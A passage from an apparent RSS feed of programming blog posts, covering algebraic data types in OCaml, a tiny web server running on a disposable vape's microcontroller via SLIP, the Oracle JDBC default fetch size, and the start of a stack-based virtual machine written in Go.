pointers/references <sup><a href="https://blog.aiono.dev#fn-1">[1]</a></sup>to return multiple values or Go's multiple return values <sup><a href="https://blog.aiono.dev#fn-2">[2]</a></sup>, because to return multiple arguments one has to create a custom type. Not having product types forces you to circumvent it with more specialized constructs that creates accidental complexity. Supporting product types as first class (See Rust and OCaml as examples) makes the language simpler and more unified, reducing the cognitive load for the user <sup><a href="https://blog.aiono.dev#fn-3">[3]</a></sup>.</p><h3>Sum Types</h3><p>Now this part is a bit less apparent if you never used a functional language. But it's a really a common use case in programming that, you probably seen a problem before where you could use sum types.</p><p>A sum type is a type composed of two other types, where the values can be <em>either</em> from the first type or the second type. For instance if you want to denote a fallible arithmetic operation, where the result is <code>int</code> if successful and a <code>string</code> containing the error message if not, the type of this result is <code>int</code> or <code>string</code>.</p><p>The name sum comes from the fact that, similar to products, if you create a sum type from types <code>N</code> and <code>M</code>, you get a type where there are <code>N + M</code> different possible values. Because you can have <code>N</code> options from the first and <code>M</code> option from the second. It's similar to logical or in the sense that, a value of a sum type is actually from the first type <em>or</em> the second type.</p><p>Sum types appear commonly in real life. A value that can be <code>null</code> is a sum type, usually called <code>Option</code> or <code>Maybe</code> in programming languages. In OCaml it is defined as:</p><pre><code>type a option = Some of a | None </code></pre><p>The <code>a</code> denotes a generic type, if you are familiar with Java, it is equivalent to <code>Option<a></a></code>. First construct <code>Some</code> is the case where a value is present, while <code>None</code> corresponds to <code>null</code> in imperative languages. This is not just an example, <code>option</code> type is very commonly used in programs written in OCaml and other functional languages. <code>null</code> being at the type level prevents many runtime errors and reduces verbosity (you don't have to write <code>null</code> checks everywhere).</p><p>Another example is modeling errors. In Go, when a function can return an error, it's idiomatic to return it as the second value. By convention, either the first value or the second value is <code>nil</code> (Go's <code>null</code> value). However, this convention is implicit and in nowhere is enforced. So when you return two values, you have 4 cases, but you actually assume only two cases can happen in practice. If both values are not <code>null</code> or <code>null</code>, that would violate the assumption. We can summarize it in a table:</p><div><table> <tr> <th>Value 1</th> <th>Value 2</th> <th>Assumed</th> </tr> <tr> <td><code>present</code></td> <td><code>null</code></td> <td>yes</td> </tr> <tr> <td><code>null</code></td> <td><code>null</code></td> <td>yes</td> </tr> <tr> <td><code>present</code></td> <td><code>present</code></td> <td>no</td> </tr> <tr> <td><code>null</code></td> <td><code>null</code></td> <td>no</td> </tr> </table></div><p>The problem is, this invariant is never validated by the type checker and therefore the user has to be aware of the convention, which creates unnecessary cognitive load for the user. For instance, <code>io.Reader</code> interface may return <code>EOF</code> error <em>while also returning some data</em>. This is not what the general Go programmers assume to be the case, since they expect either <code>err</code> or <code>val</code> to be non-<code>nil</code>. This discrepancy causes <a href="https://github.com/golang/go/issues/52577">real life</a> <a href="https://www.reddit.com/r/golang/comments/u8wsnq/i_was_using_ioreader_wrongly/">bugs</a> even though <a href="https://pkg.go.dev/io#Reader">it's documented</a>.</p><p>Another disadvantage is that the programmer can't know the product is in fact intended to model a sum type unless it's in the documentation or they read the whole code. Both of these create more cognitive load compared to sum type in the signature. Moreover, the lack of sum types cause real life bugs in general, like anything that requires human validation, such as <a href="https://nicolashery.com/decoding-json-sum-types-in-go/#my-first-nil-pointer-panic-in-go-was-due-to-lack-of-sum-types">this one</a>.</p><p>Instead, we could simply use a sum type to denote it's <em>either</em> a success with the result value, or an error with the error information. In OCaml, there is <code>result</code> type exactly for that:</p><pre><code>type (a, b) result = Ok of a | Error of b </code></pre><p>When we have a value of type <code>error</code>, the type checker enforces that only two desired conditions can happen, and the undesired conditions are <em>impossible</em> to represent in code, making the code simpler and less prone to errors.</p><h3>Using Algebraic Types in Practice</h3><p>To demonstrate the practical benefits of algebraic types, lets write an interpreter for arithmetic expressions. We will only have integers and arithmetic operators. We will not go through parsing arithmetic expressions as it's not related to the topic.</p><p>The type of expressions follows naturally from the definition:</p><pre><code>type expr = | Number of int | Add of { left : expr; right: expr } | Sub of { left : expr; right: expr } | Mul of { left : expr; right: expr } | Div of { left : expr; right: expr } </code></pre><p>The first case denotes integers for the operands. Following cases correspond to each arithmetic operator. For instance, <code>2 + (3 * 2)</code> corresponds to:</p><pre><code>let e = Add { left = Number 2; right = Mul { left = Number 3; right = Number 2; } } </code></pre><p>To evaluate expressions, we can write a simple evaluator, using pattern matching:</p><pre><code>let rec eval (e : expr) : int = match e with | Number n -&gt; n | Add { left; right } -&gt; (eval left) + (eval right) | Sub { left; right } -&gt; (eval left) - (eval right) | Mul { left; right } -&gt; (eval left) * (eval right) | Div { left; right } -&gt; (eval left) / (eval right) </code></pre><p>If you are not familiar with pattern matching, it lets us determine the which variant the value has. The possible variants come from it's type. In this case, from the definition of <code>expr</code>, we know it's either a <code>Number</code> or one of the 4 operations. For the number case, we can return it directly. In other cases, the <code>left</code> and <code>right</code> fields have type <code>expr</code>, so first we have to recursively evaluate those subterms to get their <code>int</code> value. Then we can evaluate the current expression value by using the appropriate operator.</p><p>How could you do this without algebraic types? Abstract methods with inheritance can be used to emulate sum types. So we could have an abstract base class <code>Expr</code> then extend it for each case:</p><pre><code>abstract class Expr { abstract int eval(); } class Number extends Expr { int value; int eval() { return value; } } class Plus extends Expr { Expr left, right; int eval() { return left.eval() + right.eval(); } } // Rest is omitted </code></pre><p>The base class <code>Expr</code> has a method <code>eval</code> which should return the evaluated value of the expression. Each subclass implements it, recursively calling subexpression's <code>eval</code> method. In this case, there is no clear definition of the data structure, but it's mixed with the behavior.</p><p>What if we want to interpret the expressions in a different way? Say we just want to convert it to it's written form. For the inheritance based solution, we would have to add a new base method to the class, and then implement it in the subclasses, like <code>eval</code>. With algebraic types, we could write another function that performs pattern matching. Something like:</p><pre><code>let rec expr_to_string (e : expr) : string = match e with | Number n -&gt; string_of_int n | Add { left; right } -&gt; "(" ^ (expr_to_string left) ^ "+" ^ (expr_to_string right) ^ ")" | Sub { left; right } -&gt; "(" ^ (expr_to_string left) ^ "-" ^ (expr_to_string right) ^ ")" | Mul { left; right } -&gt; "(" ^ (expr_to_string left) ^ "*" ^ (expr_to_string right) ^ ")" | Div { left; right } -&gt; "(" ^ (expr_to_string left) ^ "/" ^ (expr_to_string right) ^ ")" </code></pre><p>I don't know you but I find the latter approach better. Because in the inheritance approach the relevant behavior is far away from each other. When someone wants to understand how string conversion works, they need to jump through every class. Whereas with the pattern matching, the relevant logic stays closer. Another issue is that operations implemented as a method in the class, therefore they have full access to the object's internals. However, those operations should only access the public interface of the objects.</p><p>The abstract method approach is not the only alternative. The Visitor Pattern <sup><a href="https://blog.aiono.dev#fn-4">[4]</a></sup>exists specifically to model sum types with object hierarchies <sup><a href="https://blog.aiono.dev#fn-6">[5]</a></sup>. Using visitor pattern, we could have the following implementation:</p><pre><code>abstract class Expr { abstract <r> R accept(Visitor<r> visitor); } class Number extends Expr { int value; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Plus extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Mul extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Sub extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Div extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } interface Visitor<r> { R visit(Number number); R visit(Plus plus); R visit(Mul mul); R visit(Sub sub); R visit(Div div); } class EvalVisitor implements Visitor<integer> { public Integer visit(Number number) { return number.value; } public Integer visit(Plus plus) { return plus.left.accept(this) + plus.right.accept(this); } public Integer visit(Mul mul) { return mul.left.accept(this) * mul.right.accept(this); } public Integer visit(Sub sub) { return sub.left.accept(this) - sub.right.accept(this); } public Integer visit(Div div) { return div.left.accept(this) / div.right.accept(this); } } </integer></r></r></r></r></r></r></r></r></r></r></r></r></r></code></pre><p>It solves the problem of having to add new methods to the base class compared to naive inheritance approach. Also the relevant logic sits inside a single place, in this case the visitor implementation. However, it's a lot more verbose than pattern matching and more difficult to understand. It has more accidental complexity <sup><a href="https://blog.aiono.dev#fn-5">[6]</a></sup>compared to pattern matching. Essentially visitor pattern is poor man's pattern matching. As Mark Seeman said <sup><a href="https://blog.aiono.dev#fn-6">[5]</a></sup>:</p><blockquote><p>That's not to say that these two representations are equal in readability or maintainability. F# and Haskell sum types are declarative types that usually only take up a few lines of code. Visitor, on the other hand, is a small object hierarchy; it's a more verbose way to express the idea that a type is defined by mutually exclusive and heterogeneous cases. I know which of these alternatives I prefer, but if I were caught in an object-oriented code base, it's nice to know that it's still possible to model a domain with algebraic data types.</p></blockquote> <h2>Conclusion</h2><p>In short, for the most programming tasks you need two fundamental ways to combine types: the product and the sum. With these you can create arbitrary structures that can model real world data. Most languages have a way to express these two constructs, albeit some ways to represent it are more cumbersome such as using inheritance to emulate sum types. Using fundamental concepts you can model things in a simpler way without introducing unnecessary complexity.</p><h2>Credits</h2><p>Thanks <a href="https://www.rugu.dev/">U&#287;ur</a> for his detailed and valuable feedback on the draft of this article.</p><section><ol> <li><p><a href="https://stackoverflow.com/questions/2620146/how-do-i-return-multiple-values-from-a-function-in-c">How do I return multiple values from a function in C? - Stackoverflow</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-1">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/">Were multiple return values Go's biggest mistake?</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-2">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://minds.md/zakirullin/cognitive">Cognitive load is what matters</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-3">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://en.wikipedia.org/wiki/Visitor_pattern">Visitor Pattern</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-4">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://blog.ploeh.dk/2018/06/25/visitor-as-a-sum-type/">Visitor is a sum type</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-6">&#8617;&#65038;&#65038;<sup>1</sup></a><a href="https://blog.aiono.dev#ref-2-fn-6">&#8617;&#65038;&#65038;<sup>2</sup></a></span></li><li><p><a href="https://www.cs.unc.edu/techreports/86-020.pdf">No Silver bullet</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-5">&#8617;&#65038;&#65038;</a></span></li></ol></section> </div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:19:35 +0530</pubDate></item><item><link>https://bogdanthegeek.github.io/blog/projects/vapeserver/</link><title>Hosting a website on a disposable vape (bogdanthegeek.github.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/</guid><comments>https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/'>Post permalink</a></p></section><section class='preview-image'><img src='https://bogdanthegeek.github.io/blog/images/vapeserver.jpg' /></section><section class='parsed-content'><div><h2>Preface<a href="https://bogdanthegeek.github.io#preface">#</a></h2><p>This article is <em>NOT</em> served from a web server running on a disposable vape. If you want to see the real deal, click <a href="http://ewaste.fka.wtf">here</a>. The content is otherwise identical.</p><h2>Background<a href="https://bogdanthegeek.github.io#background">#</a></h2><p>For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for &ldquo;future&rdquo; projects (It&rsquo;s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn&rsquo;t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as &ldquo;disposable&rdquo;. Thankfully, I don&rsquo;t plan on pursuing law anytime soon.</p><p>Last year, I was tearing apart some of these fancier pacifiers for adults when I noticed something that caught my eye, instead of the expected black blob of goo hiding some ASIC (Application Specific Integrated Circuit) I see a little integrated circuit inscribed &ldquo;PUYA&rdquo;. I don&rsquo;t blame you if this name doesn&rsquo;t excite you as much it does me, most people have never heard of them. They are most well known for their flash chips, but I first came across them after reading Jay Carlson&rsquo;s blog post about <a href="https://jaycarlson.net/2023/02/04/the-cheapest-flash-microcontroller-you-can-buy-is-actually-an-arm-cortex-m0/">the cheapest flash microcontroller you can buy</a>. They are quite capable little ARM Cortex-M0+ micros.</p><p>Over the past year I have collected quite a few of these PY32 based vapes, all of them from different models of vape from the same manufacturer. It&rsquo;s not my place to do free advertising for big tobacco, so I won&rsquo;t mention the brand I got it from, but if anyone who worked on designing them reads this, thanks for labeling the debug pins!</p><h2>What are we working with<a href="https://bogdanthegeek.github.io#what-are-we-working-with">#</a></h2><p>The chip is marked <code>PUYA C642F15</code>, which wasn&rsquo;t very helpful. I was pretty sure it was a <code>PY32F002A</code>, but after poking around with <a href="http://pyocd.io/">pyOCD</a>, I noticed that the flash was 24k and we have 3k of RAM. The extra flash meant that it was more likely a <code>PY32F002B</code>, which is actually a very different chip.<sup><a href="https://bogdanthegeek.github.io#fn:1">1</a></sup></p><p>So here are the specs of a microcontroller so <em>bad</em>, it&rsquo;s basically disposable:</p><ul><li>24MHz Coretex M0+</li><li>24KiB of Flash Storage</li><li>3KiB of Static RAM</li><li>a few peripherals, none of which we will use.</li></ul><p>You may look at those specs and think that it&rsquo;s not much to work with. I don&rsquo;t blame you, a 10y old phone can barely load google, and this is about 100x slower. I on the other hand see a <em>blazingly</em> fast web server.</p><h2>Getting online<a href="https://bogdanthegeek.github.io#getting-online">#</a></h2><p>The idea of hosting a web server on a vape didn&rsquo;t come to me instantly. In fact, I have been playing around with them for a while, but after writing my post on <a href="https://bogdanthegeek.github.io/blog/insights/jlink-rtt-for-the-masses/">semihosting</a>, the penny dropped.</p><p>If you don&rsquo;t feel like reading that article, semihosting is basically syscalls for embedded ARM microcontrollers. You throw some values/pointers into some registers and call a breakpoint instruction. An attached debugger interprets the values in the registers and performs certain actions. Most people just use this to get some logs printed from the microcontroller, but they are actually bi-directional.</p><p>If you are older than me, you might remember a time before Wi-Fi and Ethernet, the dark ages, when you had to use dial-up modems to get online. You might also know that the ghosts of those modems still linger all around us. Almost all USB serial devices actually emulate those modems: a 56k modem is just 57600 baud serial device. Data between some of these modems was transmitted using a protocol called SLIP (Serial Line Internet Protocol).<sup><a href="https://bogdanthegeek.github.io#fn:2">2</a></sup></p><p>This may not come as a surprise, but Linux (and with some tweaking even macOS) supports SLIP. The <code>slattach</code> utility can make any <code>/dev/tty*</code> send and receive IP packets. All we have to do is put the data down the wire in the right format and provide a virtual tty. This is actually easier than you might imagine, pyOCD can forward all semihosting though a telnet port. Then, we use <code>socat</code> to link that port to a virtual tty:</p><div><pre><code><span><span>pyocd gdb -S -O semihost_console_type<span>=</span>telnet -T <span>$(</span>PORT<span>)</span> <span>$(</span>PYOCDFLAGS<span>)</span> &amp; </span></span><span><span>socat PTY,link<span>=</span><span>$(</span>TTY<span>)</span>,raw,echo<span>=</span> TCP:localhost:<span>$(</span>PORT<span>)</span>,nodelay &amp; </span></span><span><span>sudo slattach -L -p slip -s <span>115200</span> <span>$(</span>TTY<span>)</span> &amp; </span></span><span><span>sudo ip addr add 192.168.190.1 peer 192.168.190.2/24 dev sl0 </span></span><span><span>sudo ip link set mtu <span>1500</span> up dev sl0 </span></span></code></pre></div><p>Ok, so we have a &ldquo;modem&rdquo;, but that&rsquo;s hardly a web server. To actually talk TCP/IP, we need an IP stack. There are many choices, but I went with <a href="https://github.com/adamdunkels/uip/tree/uip-0-9">uIP</a> because it&rsquo;s pretty small, doesn&rsquo;t require an RTOS, and it&rsquo;s easy to port to other platforms. It also, helpfully, comes with a very minimal HTTP server example.</p><p>After porting the SLIP code to use semihosting, I had a working web server&hellip;half of the time. As with most highly optimised libraries, uIP was designed for 8 and 16-bit machines, which rarely have memory alignment requirements. On ARM however, if you dereference a <code>u16 *</code>, you better hope that address is even, or you&rsquo;ll get an exception. The <code>uip_chksum</code> assumed <code>u16</code> alignment, but the script that creates the filesystem didn&rsquo;t. I actually decided to modify a bit the structure of the filesystem to make it a bit more portable. This was my first time working with <code>perl</code> and I have to say, it&rsquo;s quite well suited to this kind of task.</p><h2>Blazingly fast<a href="https://bogdanthegeek.github.io#blazingly-fast">#</a></h2><p>So how fast is a web server running on a disposable microcontroller. Well, initially, not very fast. Pings took ~1.5s with 50% packet loss and a simple page took over 20s to load. That&rsquo;s so bad, it&rsquo;s actually funny, and I kind of wanted to leave it there.</p><p>However, the problem was actually between the seat and the steering wheel the whole time. The first implementation read and wrote a single character at a time, which had a massive overhead associated with it. I previously benchmarked semihosting on this device, and I was getting ~20KiB/s, but uIP&rsquo;s SLIP implementation was designed for very low memory devices, so it was serialising the data byte by byte. We have a whopping 3kiB of RAM to play with, so I added a ring buffer to cache reads from the host and feed them into the SLIP poll function. I also split writes in batches to allow for escaping.</p><p>Now this is what I call blazingly fast! Pings now take 20ms, no packet loss and a full page loads in about 160ms. This was using using almost all of the RAM, but I could also dial down the sizes of the buffer to have more than enough headroom to run other tasks. The project repo has everything set to a nice balance latency and RAM usage:</p><pre><code>Memory region Used Size Region Size %age Used FLASH: 5116 B 24 KB 20.82% RAM: 1380 B 3 KB 44.92% </code></pre><p>For this blog however, I paid for none of the RAM, so I&rsquo;ll use all of the RAM.</p><p>As you may have noticed, we have just under 20kiB (80%) of storage space. That may not be enough to ship all of React, but as you can see, it&rsquo;s more than enough to host this entire blog post. And this is not just a static page server, you can run any server-side code you want, if you know C that is.</p><p>Just for fun, I added a json api endpoint to get the number of requests to the main page (since the last crash) and the unique ID of the microcontroller.</p><h2>Resources<a href="https://bogdanthegeek.github.io#resources">#</a></h2><ul><li><a href="https://github.com/BogdanTheGeek/semihost-ip">Code for this project</a></li></ul></div></section>]]></description><pubDate>Mon, 15 Sep 2025 22:55:15 +0530</pubDate></item><item><link>https://in.relation.to/2025/01/24/jdbc-fetch-size/</link><title>Why you should care about the JDBC fetch size (in.relation.to)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhjby7/why_you_should_care_about_the_jdbc_fetch_size/</guid><comments>https://www.reddit.com/r/programming/comments/1nhjby7/why_you_should_care_about_the_jdbc_fetch_size/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1nhjby7/why_you_should_care_about_the_jdbc_fetch_size/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.gravatar.com/avatar/77987db6d7dd75abd4a14651641b3d46?s=240' /></section><section class='parsed-content'><div><p>Last week, Jeroen Borgers asked on Twitter for a standard way to set the JDBC fetch size in JPA, that is, for Hibernate&rsquo;s <code>Query.setFetchSize()</code> to be added to the standard APIs. This took me slightly by surprise, because nobody has ever asked for that before, but I asked him to go ahead and <a href="https://github.com/jakartaee/persistence/issues/696">open an issue</a>. After some discussion, I think I&rsquo;m satisfied that his actual needs can be met in a different way, but the discussion did help to draw my attention to something important: <strong>the default JDBC fetch size for the Oracle driver is 10.</strong></p><p>Now, I would never pretend to be an expert in Oracle performance tuning, and I don&rsquo;t use Oracle every day. Even so, I felt like this is something that I definitely <em>should</em> have known off the top of my head, after so many years working with JDBC.</p><p>Out of curiosity, I ran a <a href="https://x.com/1ovthafew/status/1880004837515169969">poll</a> on Twitter, which was shared by Franck Pachot among others:</p><p>Now, look, <em>N</em>=121 is an okay sample size, but of course this was not a representative sample. So how would we expect this sample to skew compared to a typical random sample of developers? Well, I would like to think that my followers know quite a lot more about databases than most, and I&rsquo;m even more confident in saying this about Franck&rsquo;s followers.</p><p>But there&rsquo;s another problem: I&rsquo;m really interested in the responses of Oracle users, and I don&rsquo;t know how many of the people who clicked "What&rsquo;s a JDBC fetch size?" actually clicked it because I didn&rsquo;t have room to add a "Just show me the results" option. In a lame attempt to compensate for this, I&rsquo;m going to throw away all the people who claim to not know what a JDBC fetch size is, and focus on the remaining respondents.</p><p><strong>Of those respondents, more than 70% claim to be using Oracle and are either unaware of the default fetch size, or know it, but don&rsquo;t change it.</strong></p><p>I got in contact with Lo&iuml;c Lef&egrave;vre from Oracle to make sure that I fully understood the implications of this. He and his colleague Connor McDonald pointed out to me that actually the Oracle JDBC driver has an adaptive fetch size in the 23ai version, and that in the best case the driver will actually increase the fetch size to 250 on the fourth fetch, and that this behavior depends on the size of each row in the result set. Nice to know.</p><p>Alright, so, I&rsquo;m going to make the following assertions upfront:</p><div><ol> <li><p>Most Java data access code is doing online transaction processing, and not batch processing.</p></li> <li><p>For such programs, most queries return between 10<sup>0</sup>and 10<sup>2</sup>rows, with 10<sup>3</sup>rows being possible but already extremely rare. By contrast, 10<sup>4</sup>rows and above characterizes the offline batch processing case.</p></li> <li><p>The size of each row of such a query result set is not usually huge.</p></li> <li><p>Common practice&mdash;&#8203;especially for programs using Hibernate or JPA&mdash;&#8203;is to limit results using <code>LIMIT</code>, read the whole JDBC result set immediately, putting the results into a <code>List</code> or whatever, and then carry on working with that list.</p></li> <li><p>It&rsquo;s common for the Java client to be on a different physical machine to the database server.</p></li> <li><p>It&rsquo;s common for the Java client to have access to plentiful memory.</p></li> <li><p>The database server is typically the least scalable element of the system.</p></li> <li><p>For online transaction processing we care a lot about latency.</p></li> </ol> </div><p><em>Of course</em> one can easily concoct scenarios in which one or more of these assumptions is violated. Yes yes yes, I&rsquo;m perfectly aware that some people do batch processing in Java. The comments I&rsquo;m about to make do not apply to batch processing. But I insist that what I&rsquo;ve described above is a fairly good description of the <em>most common case</em>.</p><p>Now consider what happens for a query returning 12 rows:</p><div><ol> <li><p>On a first visit to the database server, the server executes the query, builds up the result set in memory, and then returns 10 rows to the client.</p></li> <li><p>The Java client iterates over those ten rows, hydrating a graph of Java objects, and putting them into a list or whatever, and then blocks waiting for the next 10 rows.</p></li> <li><p>The JDBC driver requests the remaining 2 rows from the server which has been keeping the result set waiting.</p></li> <li><p>The Java client can now process the remaining 2 rows, and finally carry on with what it was doing.</p></li> </ol> </div><p>This is bad.</p><p>Not only did we make two trips to the server when one trip would have been better, we also forced the server to maintain client-associated state across an interaction. I repeat: the database server is typically the <em>least scalable tier</em>. We almost never want the database server to hold state while waiting around for the client to do stuff.</p><p>For a query which returns 50 rows, the story is even worse. Even in the best case, the default behavior of the driver requires four trips to the database to retrieve those 50 rows. Folks, a typical JVM is just not going to blow up with an OOME if you send it 50 rows at once!</p><p>So, my recommendations are as follows:</p><div><ol> <li><p>The default JDBC fetch size should be set to a large number, somewhere between 10<sup>3</sup>and 2<sup>31</sup>-1. This can be controlled via <code>hibernate.jdbc.fetch_size</code>, or, even better, on Oracle, via the <code>defaultRowPrefetch</code> JDBC connection property. Note that most JDBC drivers have an unlimited fetch size by default, and I believe that this is the best default.</p></li> <li><p>Use pagination via a SQL <code>LIMIT</code>, that is, the standard JPA <code>setMaxResults()</code> API, to control the size of the result set if necessary. Remember: if you&rsquo;re calling JPA&rsquo;s <code>getResultList()</code>, setting a smaller fetch size is not going to help control the amount of data retrieved <em>at all</em>, since the JPA provider is just going to eagerly read it all into a list anyway!</p></li> <li><p>For special cases like batch processing of huge datasets, use <a href="https://docs.jboss.org/hibernate/orm/7.0/introduction/html_single/Hibernate_Introduction.html#stateless-sessions"><code>StatelessSession</code></a> or <a href="https://docs.jboss.org/hibernate/orm/7.0/introduction/html_single/Hibernate_Introduction.html#session-cache-management"><code>Session.clear()</code></a> to control the use of memory on the Java side, and <a href="https://docs.jboss.org/hibernate/orm/7.0/javadocs/org/hibernate/ScrollableResults.html"><code>ScrollableResults</code></a> together with <a href="https://docs.jboss.org/hibernate/orm/7.0/javadocs/org/hibernate/ScrollableResults.html#setFetchSize(int)"><code>setFetchSize()</code></a> to control fetching. Or even better, just make life easy for yourself and write a damn stored procedure.</p></li> </ol> </div><p>So if you belong to that 70% of Oracle users, you should be able to make your program more responsive and more scalable with almost no work, using this One Simple Trick.</p><p>UPDATE: Note that if you try searching for "JDBC fetch size" on Google, you&rsquo;ll encounter a bunch of misinformation. The <a href="https://franckpachot.medium.com/oracle-postgres-jdbc-fetch-size-3012d494712">one source which gets this right</a> is (coincidence?) from Franck Pachot.</p></div></section>]]></description><pubDate>Mon, 15 Sep 2025 17:03:17 +0530</pubDate></item><item><link>https://blog.phakorn.com/posts/2025/building-a-simple-vm/</link><title>Building a Simple Stack-Based Virtual Machine in Go (blog.phakorn.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhfigu/building_a_simple_stackbased_virtual_machine_in_go/</guid><comments>https://www.reddit.com/r/programming/comments/1nhfigu/building_a_simple_stackbased_virtual_machine_in_go/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 18 min | <a href='https://www.reddit.com/r/programming/comments/1nhfigu/building_a_simple_stackbased_virtual_machine_in_go/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I’ve been experimenting with building a minimal stack-based virtual machine in Go, inspired by WebAssembly and the EVM.</p><p>It handles compiled bytecode, basic arithmetic, and simple execution flow. Wrote up the process here</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://blog.phakorn.com/posts/2025/building-a-simple-vm/index.png' /></section><section class='parsed-content'><article> <h2>Introduction</h2><p>Inspired by virtual machines (VMs) like WebAssembly and the Ethereum Virtual Machine, I set out to challenge myself by crafting a simplified version. In this post, I share the process of implementing a VM in Go that operates on compiled bytecode and handles basic arithmetic operations.</p><h2>Architectural Design</h2> <h2>Stack Machine or Register Machine?</h2><p>When exploring the core architecture of VMs, two primary models stand out: <strong>stack machine</strong> and <strong>register machine</strong>.</p><p>A stack machine, such as WebAssembly, operates on a <strong>last-in, first-out (LIFO)</strong> basis. Instructions in this model primarily manipulate data at the top of the stack. This model is often used in implementation of VM due to its simplicity and ease of implementation.</p><p>A register machine akin to modern CPU designs, which use a set of registers (backed by hardware) that instructions can directly manipulate. This model can potentially enhance execution speed by reducing the overhead of repetitive data movement and often allows for more sophisticated optimizations during code compilation.</p><p>I&rsquo;ve chosen to go with a <strong>stack machine</strong> architecture. This decision was driven by the model&rsquo;s inherent simplicity and the straightforward nature of its execution flow, which significantly eases both the development and debugging processes.</p><h2>Word Size</h2><p>A <strong>word</strong> represents a fixed-sized data unit that the processor&rsquo;s instruction set or hardware handles collectively.</p><p>Choosing a larger word size, such as 64-bit, allows the VM to process more data per instruction. This capability enables more efficient management of complex data types and operations with fewer instructions. Although these benefits are clear, it&rsquo;s crucial to note that the actual performance improvements can vary, depending on the underlying system&rsquo;s architecture and the VM&rsquo;s ability to utilize it effectively.</p><p>I&rsquo;ve chosen a 64-bit architecture for the VM, which means that each instruction can process data up to 8 bytes in size.</p><h2>Memory</h2><p>A byte-addressable memory model has been chosen for the VM. This model allows each byte of memory to be individually addressed, enhancing the system&rsquo;s flexibility when managing different data size.</p><h2>Implementation</h2> <h2>Opcode</h2><p>Opcodes (operation codes) are fundamental elements that define the set of operations the VM can perform. Each opcode corresponds to a specific operation, ranging from simple data manipulation to complex arithmetic functions.</p><p>Importantly, opcodes operate on raw bytes, without any awareness of higher-level data types such as strings or signed integers. This approach highlights the VM&rsquo;s role as a flexible, low-level execution environment, handling data purely at the byte level.</p><p>Below are the opcodes supported by the VM.</p><pre><code><span><span>const</span><span> (</span></span> <span><span>// POP is used to discard the top value from the stack and decrement the stack pointer.</span></span> <span><span>POP</span><span> Opcode</span><span> =</span><span> iota</span></span> <span><span>// PUSH1 is used to place a 1 byte data onto the stack.</span></span> <span><span>PUSH1</span></span> <span><span>// PUSH8 is used to place a 8 byte (a word) data onto the stack.</span></span> <span><span>PUSH8</span></span> <span><span>// LOAD is used to load 8 byte (a word) data from memory into the stack at a specified offset using the top value of the stack</span></span> <span><span>LOAD8</span></span> <span><span>// ADD is used to add two operands.</span></span> <span><span>ADD</span></span> <span><span>// SUB subtracts the top value of the stack from the second top value of the stack.</span></span> <span><span>SUB</span></span> <span><span>// MUL multiplies the top two values on the stack.</span></span> <span><span>MUL</span></span> <span><span>// DIV divides the top value of the stack by the second top value of the stack, errors on division by zero.</span></span> <span><span>DIV</span></span> <span><span>// STORE1 stores a 1-byte value into memory at a specified offset, using the top value of the stack as the offset and the second top value as the data to store</span></span> <span><span>STORE1</span></span> <span><span>// STORE8 stores an 8-byte value (a word) into memory at a specified offset, using the top value of the stack as the offset and the second top value as the data to store</span></span> <span><span>STORE8</span></span> <span><span>// RETURN is used to exit the execution and return a block of memory.</span></span> <span><span>// It pops the size and offset from the stack and returns the specified block from memory.</span></span> <span><span>RETURN</span></span> <span><span>)</span></span></code></pre><p>This definition limits each opcode to one byte, allowing the VM to support up to 256 distinct opcodes.</p><h3>Opcode Functions</h3><p>Each opcode has a corresponding function of type <code>opFunc</code>, which operates on the VM&rsquo;s state to perform its designated task. Below are examples for <code>PUSH8</code> and <code>ADD</code>:</p><pre><code><span><span>// standardize type for opcode function in vm</span></span> <span><span>type</span><span> (</span></span> <span><span> opFunc</span><span> func</span><span>(</span><span>v</span><span> *</span><span>vm</span><span>) ([]</span><span>byte</span><span>, </span><span>error</span><span>)</span></span> <span><span>)</span></span> <span><span>func</span><span> opPush8</span><span>(</span><span>v</span><span> *</span><span>vm</span><span>) ([]</span><span>byte</span><span>, </span><span>error</span><span>) {</span></span> <span><span> value</span><span> :=</span><span> binary</span><span>.</span><span>BigEndian</span><span>.</span><span>Uint64</span><span>(</span><span>v</span><span>.</span><span>bytecode</span><span>[</span><span>v</span><span>.</span><span>pc</span><span> : </span><span>v</span><span>.</span><span>pc</span><span>+</span><span>8</span><span>])</span></span> <span><span> v</span><span>.</span><span>stack</span><span>[</span><span>v</span><span>.</span><span>sp</span><span>] </span><span>=</span><span> value</span></span> <span><span> 